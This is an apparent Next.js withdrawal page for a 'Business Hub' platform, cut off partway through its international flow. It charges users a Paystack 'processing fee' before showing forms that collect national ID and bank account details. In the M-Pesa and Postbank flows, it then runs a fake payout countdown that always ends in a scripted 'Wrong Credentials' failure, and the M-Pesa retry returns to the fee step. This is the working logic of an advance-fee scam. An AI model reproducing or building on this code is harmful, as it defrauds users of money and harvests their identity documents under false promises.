// pages/withdraw.js — full-page withdrawals (M-Pesa + Other Countries).
// Replaces the pop-up modals. Submitted requests are emailed automatically to
// the admin with a client auto-reply (via /api/notify), falling back to mailto.
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import { useUser } from '../lib/useUser';
import { sendNotify } from '../lib/notify';
import FlowShell from '../components/FlowShell';

function formatMmSs(ms) {
  if (ms <= 0) return '0:00';
  const t = Math.floor(ms / 1000);
  return `${Math.floor(t / 60)}:${String(t % 60).padStart(2, '0')}`;
}

// ── Worldwide bank directory (icon, sample account format, validator) ──────────
const COUNTRY_META = {
  GB: { country: 'United Kingdom', flag: '🇬🇧', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
  DE: { country: 'Germany',        flag: '🇩🇪', ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
  FR: { country: 'France',         flag: '🇫🇷', ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
  ES: { country: 'Spain',          flag: '🇪🇸', ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
  IT: { country: 'Italy',          flag: '🇮🇹', ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
  NL: { country: 'Netherlands',    flag: '🇳🇱', ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
  CH: { country: 'Switzerland',    flag: '🇨🇭', ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
  IE: { country: 'Ireland',        flag: '🇮🇪', ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
  BE: { country: 'Belgium',        flag: '🇧🇪', ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
  PT: { country: 'Portugal',       flag: '🇵🇹', ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
  SE: { country: 'Sweden',         flag: '🇸🇪', ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
  NO: { country: 'Norway',         flag: '🇳🇴', ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
  PL: { country: 'Poland',         flag: '🇵🇱', ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
  AE: { country: 'United Arab Emirates', flag: '🇦🇪', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
  SA: { country: 'Saudi Arabia',   flag: '🇸🇦', ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
  BR: { country: 'Brazil',         flag: '🇧🇷', ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
  EG: { country: 'Egypt',          flag: '🇪🇬', ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
  PK: { country: 'Pakistan',       flag: '🇵🇰', ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
  KE: { country: 'Kenya',          flag: '🇰🇪', ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
  MB: { country: 'Mobile Banking', flag: '📱', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
  US: { country: 'United States',  flag: '🇺🇸', ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
  CA: { country: 'Canada',         flag: '🇨🇦', ph: '0123 4567 89',           re: /^\d{7,12}$/ },
  NG: { country: 'Nigeria',        flag: '🇳🇬', ph: '0123456789',             re: /^\d{10}$/ },
  ZA: { country: 'South Africa',   flag: '🇿🇦', ph: '0123 4567 89',           re: /^\d{9,11}$/ },
  GH: { country: 'Ghana',          flag: '🇬🇭', ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
  IN: { country: 'India',          flag: '🇮🇳', ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
  CN: { country: 'China',          flag: '🇨🇳', ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
  JP: { country: 'Japan',          flag: '🇯🇵', ph: '1234567',                re: /^\d{7,8}$/ },
  AU: { country: 'Australia',      flag: '🇦🇺', ph: '0123 4567',              re: /^\d{6,10}$/ },
  SG: { country: 'Singapore',      flag: '🇸🇬', ph: '012 345678 9',           re: /^\d{9,12}$/ },
  JM: { country: 'Jamaica',        flag: '🇯🇲', ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
  MX: { country: 'Mexico',         flag: '🇲🇽', ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
};
const BANKS_BY_COUNTRY = {
  GB: ['Barclays Bank', 'HSBC UK', 'Lloyds Bank', 'NatWest', 'Standard Chartered'],
  DE: ['Deutsche Bank', 'Commerzbank', 'DZ Bank'],
  FR: ['BNP Paribas', 'Société Générale', 'Crédit Agricole'],
  ES: ['Banco Santander', 'BBVA', 'CaixaBank'],
  IT: ['UniCredit', 'Intesa Sanpaolo'],
  NL: ['ING Bank', 'Rabobank', 'ABN AMRO'],
  CH: ['UBS', 'Credit Suisse'],
  IE: ['Allied Irish Banks (AIB)', 'Bank of Ireland'],
  BE: ['KBC Bank'],
  PT: ['Millennium BCP'],
  SE: ['Nordea', 'SEB'],
  NO: ['DNB'],
  PL: ['PKO Bank Polski'],
  AE: ['Emirates NBD', 'First Abu Dhabi Bank'],
  SA: ['Al Rajhi Bank', 'Saudi National Bank'],
  BR: ['Itaú Unibanco', 'Banco Bradesco', 'Banco do Brasil'],
  EG: ['National Bank of Egypt'],
  PK: ['HBL (Habib Bank)', 'United Bank (UBL)'],
  KE: ['Postbank Kenya', 'Equity Bank', 'KCB Bank', 'Co-operative Bank', 'Absa Bank Kenya'],
  MB: ['Mobile Banking'],
  US: ['Bank of America', 'JPMorgan Chase', 'Wells Fargo', 'Citibank'],
  CA: ['RBC Royal Bank', 'TD Canada Trust', 'Scotiabank'],
  NG: ['Guaranty Trust Bank (GTBank)', 'Access Bank', 'First Bank of Nigeria', 'Zenith Bank'],
  ZA: ['Standard Bank', 'First National Bank (FNB)', 'Absa', 'Capitec', 'Nedbank'],
  GH: ['Ecobank Ghana', 'GCB Bank'],
  IN: ['State Bank of India (SBI)', 'HDFC Bank', 'ICICI Bank', 'Axis Bank'],
  CN: ['ICBC', 'Bank of China', 'China Construction Bank'],
  JP: ['MUFG Bank', 'Sumitomo Mitsui (SMBC)'],
  AU: ['Commonwealth Bank', 'ANZ', 'Westpac', 'NAB'],
  SG: ['DBS Bank', 'OCBC Bank', 'UOB'],
  JM: ['National Commercial Bank (NCB)', 'Scotiabank Jamaica', 'JN Bank'],
  MX: ['BBVA México', 'Banorte', 'Citibanamex'],
};
const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
  names.map(name => ({ id: `${code}-${name}`, name, code, ...COUNTRY_META[code] }))
).sort((a, b) => a.name.localeCompare(b.name));

// Registration uses full country names; a few differ from the bank directory.
const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };

// Mobile Banking is offered to every user regardless of country.
const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');

// Withdrawal processing fee — priced in USD, charged in KES via a dynamic conversion.
const FEE_USD    = 5;
const USD_TO_KES = 130;                              // approximate USD → KES rate
const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650

// Bank withdrawal processing fee (Postbank Kenya + all other banks) — priced in
// USD, converted to KES dynamically.
const BANK_FEE_USD = 23;
const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES); // = KES 2,990

// Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
const BULK_THRESHOLD_KES = 25000;

// ── M-Pesa flow (fee → form → pending → failed) ───────────────────────────────
function MpesaFlow({ user, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'fee');
  const [phone,    setPhone]    = useState(user?.phone || '');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);

  // countdown
  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  async function handlePayFee() {
    if (!phone.trim()) { alert('Enter your M-Pesa number'); return; }
    setLoading(true);
    try {
      const res  = await fetch('/api/paystack/initialize', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: user.email, amount: FEE_KES, phone, plan: 'mpesa_withdrawal_fee' }),
      });
      const data = await res.json();
      if (data.status) { window.location.href = data.data.authorization_url; return; }
      alert('Payment could not be initiated. Please try again.');
    } catch { alert('Network error. Please check your connection.'); }
    setLoading(false);
  }

  async function handleSubmitForm() {
    const errs = {};
    if (!phone.trim())    errs.phone    = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }
    // Email the request to admin + auto-reply to the client (fire and continue)
    sendNotify({
      type: 'M-Pesa Withdrawal Request',
      name: user?.fullName || '', email: user?.email || '', phone,
      subject: 'M-Pesa Withdrawal Request',
      details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}`,
    });
    setStep('pending');
  }

  const isLow = remaining < 30 * 1000;
  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));

  // Bulk amounts (above KES 25,000) must be withdrawn through the bank, not M-Pesa.
  if (Number(user?.balance || 0) > BULK_THRESHOLD_KES) {
    return (
      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="📲" accent="linear-gradient(135deg, #007A3D, #00A651)">
        <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Because this is a <strong>bulk amount</strong> (above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>), it must be withdrawn <strong>through the bank</strong>, not M-Pesa.
        </div>
        <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)' }} onClick={() => router.push('/withdraw?method=international')}>
          🏦 Withdraw via Bank
        </button>
        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>← Back to Dashboard</button>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="📲" accent="linear-gradient(135deg, #007A3D, #00A651)">
      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: '#007A3D', background: '#F0FFF4' }}>
            A one-time <strong>processing fee of ${FEE_USD} USD</strong> (≈ <strong>KES {FEE_KES.toLocaleString()}</strong>) is required to access the M-Pesa withdrawal form. The amount is converted to KES automatically.
          </div>
          <div className="pay-amount">
            <div className="pay-amount-label">M-Pesa Processing Fee</div>
            <div className="pay-amount-value" style={{ color: '#007A3D' }}>${FEE_USD} USD</div>
            <div className="pay-amount-sub">≈ KES {FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal form</div>
          </div>
          <div className="pay-phone-label">M-Pesa Number</div>
          <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }} onClick={handlePayFee} disabled={loading}>
            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${FEE_USD} USD via Paystack`}
          </button>
          <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#007A3D', background: '#F0FFF4', marginBottom: 20 }}>
            Enter your details accurately. Your National ID must match your M-Pesa registration.
          </div>
          <div className="pay-phone-label">M-Pesa Phone Number</div>
          <input className="pay-phone-input" type="tel" value={phone}
            onChange={e => { setPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#ef4444' : undefined }} />
          {errors.phone && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" type="text" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#ef4444' : undefined }} />
          {errors.idNumber && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginTop: 20 }} onClick={handleSubmitForm}>
            💸 Submit Withdrawal Request
          </button>
          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#F0FFF4', border: '1.5px solid #6EE7B7', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ fontSize: 22 }}>📲</span>
            <p style={{ margin: 0, fontSize: 14, color: '#065F46', lineHeight: 1.65 }}>
              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#ef4444' : '#007A3D', background: '#F0FFF4', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#FECACA' : '#6EE7B7'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#D1FAE5', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? 'linear-gradient(90deg, #ef4444, #DC2626)' : 'linear-gradient(90deg, #007A3D, #00A651)', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your M-Pesa line active and await the STK push.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#FEF2F2', border: '1.5px solid #FECACA', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ fontSize: 24 }}>⚠️</span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#991B1B' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#7F1D1D', lineHeight: 1.65 }}>
                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => setStep('fee')}>🔄 Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#DC2626' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
function PostbankFlow({ user, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'choice');
  const [name,     setName]     = useState(user?.fullName || '');
  const [account,  setAccount]  = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  async function handlePayFee() {
    setLoading(true);
    try {
      const res = await fetch('/api/paystack/initialize', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: user.email, amount: BANK_FEE_KES, phone: user.phone || '', plan: 'postbank_withdrawal_fee' }),
      });
      const data = await res.json();
      if (data.status) { window.location.href = data.data.authorization_url; return; }
      alert('Payment could not be initiated. Please try again.');
    } catch { alert('Network error. Please check your connection.'); }
    setLoading(false);
  }

  function handleSubmitForm() {
    const errs = {};
    if (!name.trim())     errs.name     = 'Account holder name is required';
    if (!account.trim())  errs.account  = 'Postbank account number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }
    sendNotify({
      type: 'Postbank Kenya Withdrawal Request',
      name: name.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Postbank Kenya Withdrawal Request',
      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });
    setStep('pending');
  }

  const isLow    = remaining < 30 * 1000;
  const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
  const accent   = 'linear-gradient(135deg, #1D4ED8, #2563EB)';
  const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;

  return (
    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="🏦" accent={accent}>
      {step === 'choice' && overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
            Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
          </div>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
            🏦 Continue with Postbank Kenya
          </button>
        </>
      )}

      {step === 'choice' && !overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong> — it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            ✅ Yes, withdraw with M-Pesa (recommended)
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
            🏦 No, I can’t use M-Pesa
          </button>
        </>
      )}

      {step === 'management' && (
        <>
          <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
            Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            📲 No — take me to M-Pesa
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
            🏦 Yes, management asked me — continue with Postbank
          </button>
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
            A one-time <strong>processing fee of ${BANK_FEE_USD} USD</strong> (≈ <strong>KES {BANK_FEE_KES.toLocaleString()}</strong>) is required to process your Postbank Kenya withdrawal. The amount is converted to KES automatically.
          </div>
          <div className="pay-amount">
            <div className="pay-amount-label">Postbank Processing Fee</div>
            <div className="pay-amount-value" style={{ color: '#1D4ED8' }}>${BANK_FEE_USD} USD</div>
            <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal</div>
          </div>
          <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${BANK_FEE_USD} USD via Paystack`}
          </button>
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
          <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF', marginBottom: 20 }}>
            Enter your Postbank Kenya account details accurately. They must match your registered Postbank account.
          </div>
          <div className="pay-phone-label">Account Holder Name</div>
          <input className="pay-phone-input" value={name}
            onChange={e => { setName(e.target.value); setErrors(p => ({ ...p, name: undefined })); }}
            placeholder="e.g. John Otieno" style={{ borderColor: errors.name ? '#ef4444' : undefined }} />
          {errors.name && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.name}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>Postbank Account Number</div>
          <input className="pay-phone-input" value={account}
            onChange={e => { setAccount(e.target.value); setErrors(p => ({ ...p, account: undefined })); }}
            placeholder="e.g. 0112345678" style={{ borderColor: errors.account ? '#ef4444' : undefined }} />
          {errors.account && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.account}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#ef4444' : undefined }} />
          {errors.idNumber && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm}>
            💸 Submit Withdrawal Request
          </button>
          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#EFF6FF', border: '1.5px solid #BFDBFE', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ fontSize: 22 }}>🏦</span>
            <p style={{ margin: 0, fontSize: 14, color: '#1E3A8A', lineHeight: 1.65 }}>
              Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#ef4444' : '#1D4ED8', background: '#EFF6FF', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#FECACA' : '#BFDBFE'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#DBEAFE', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? 'linear-gradient(90deg, #ef4444, #DC2626)' : 'linear-gradient(90deg, #1D4ED8, #2563EB)', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your line active and await confirmation.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#FEF2F2', border: '1.5px solid #FECACA', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ fontSize: 24 }}>⚠️</span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#991B1B' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#7F1D1D', lineHeight: 1.65 }}>
                The account or ID details you provided could not be verified. Please ensure they match your Postbank Kenya account and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}>🔄 Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#DC2626' }}>Please ensure your Postbank account number and National ID are correct.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── International flow (bank selector) ─────────────────────────────────────────
function InternationalFlow({ user, initialStep }) {
  const router = useRouter();
  // Every "Other Countries" withdrawal pays the $23 USD fee directly — no
  // M-Pesa detour and no management gate, regardless of the amount withdrawn.
  const [gate,          setGate]          = useState(initialStep === 'form' ? 'form' : 'fee'); // fee → form
  const [loading,       setLoading]       = useState(false);
  const [accountName,   setAccountName]   = useState('');
  const [selectedBank,  setSelectedBank]  = useState(null);
  const [bankOpen,      setBankOpen]      = useState(false);
  const [bankQuery,     setBankQuery]     = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [errors,        setErrors]        = useState({});
  const [done,          setDone]          = useState(false);
  const [sending,       setSending]       = useState(false);

  // Default to the country the user chose at registration
  const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
  const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
  const q = bankQuery.trim().toLowerCase();
  // Default list always offers Mobile Banking first, then the user's country banks.
  const homeDefault = homeBanks.length ? [MOBILE_BANK, ...homeBanks].filter(Boolean) : WORLD_BANKS;
  const filteredBanks = q
    ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
    : homeDefault;

  const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
  const acctValid   = !!selectedBank && selectedBank.re.test(cleanedAcct);
  const formValid   = accountName.trim().length > 0 && !!selectedBank && acctValid;

  function selectBank(b) {
    // Postbank Kenya has its own flow (M-Pesa prompt + processing fee)
    if (b.name === 'Postbank Kenya') { router.push('/withdraw?method=postbank'); return; }
    setSelectedBank(b); setBankOpen(false); setBankQuery(''); setAccountNumber('');
    setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
  }

  async function handlePayFee() {
    setLoading(true);
    try {
      const res = await fetch('/api/paystack/initialize', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: user.email, amount: BANK_FEE_KES, phone: user.phone || '', plan: 'international_withdrawal_fee' }),
      });
      const data = await res.json();
      if (data.status) { window.location.href = data.data.authorization_url; return; }
      alert('Payment could not be initiated. Please try again.');
    } catch { alert('Network error. Please check your connection.'); }
    setLoading(false);
  }

  async function handleSubmit() {
    if (!formValid || sending) return;
    setSending(true);
    const details =
      `Account Holder Name: ${accountName.trim()}\n` +
      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
      `Account Number: ${accountNumber.trim()}\n` +
      `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;
    const ok = await sendNotify({
      type: 'International Withdrawal Request',
      name: accountName.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Withdrawal Request — Other Countries', details,
    });
    setSending(false);
    if (ok) { setDone(true); return; }
    // Fallback to email app if server email isn't available
    const body = `Hello Business Hub,\n\nI would like to request a withdrawal to my bank account.\n\n${details}\n\nThank you.`;
    window.location.href = `mailto:businesshub.comke@gmail.com?subject=${encodeURIComponent('Withdrawal Request — Other Countries')}&body=${encodeURIComponent(body)}`;
  }

  if (done) {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="🌍" accent="linear-gradient(135deg, #1D4ED8, #2563EB)">
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ fontSize: 56, marginBottom: 8 }}>✅</div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1D4ED8', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF', textAlign: 'left', marginTop: 12 }}>
            We’ve received your withdrawal request and emailed you a confirmation at <strong>{user?.email}</strong>. Our payments team will process it and be in touch.
          </div>
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)', marginTop: 18 }} onClick={() => router.push('/dashboard')}>Back to Dashboard</button>
        </div>
      </FlowShell>
    );
  }

  // M-Pesa / management gate — shown before any bank withdrawal (all banks)
  if (gate !== 'form') {
    const accent = 'linear-gradient(135deg, #1D4ED8, #2563EB)';
